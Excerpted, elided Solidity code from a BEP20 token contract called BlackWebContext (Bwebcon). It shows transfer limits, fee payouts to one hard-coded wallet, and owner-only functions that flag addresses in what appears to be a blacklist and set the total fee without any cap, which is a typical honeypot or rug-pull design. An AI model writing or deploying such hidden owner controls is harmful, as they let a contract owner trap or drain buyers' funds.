...
contract Bwebcon  is IBEP20, Auth {
    ...
    string constant _name = "BlackWebContext";
    string constant _symbol = "Bwebcon";
    ...
    address private marketingFeeReceiver = 0x90e8a5Df65dD9E50D7D0a8Df51e34e4615194c22;
    address private buybackFeeReceiver = 0x90e8a5Df65dD9E50D7D0a8Df51e34e4615194c22;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Bwebcon happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Bwebcon happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Bwebcon Transfer happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Bwebcon TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Bwebcon receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
        require(BuyBackSuccess, "Bwebcon receiver rejected ETH transfer");
    ...
    function setDLBwebcon(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEBwebcon(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Bwebcon Can't let you take all native token");
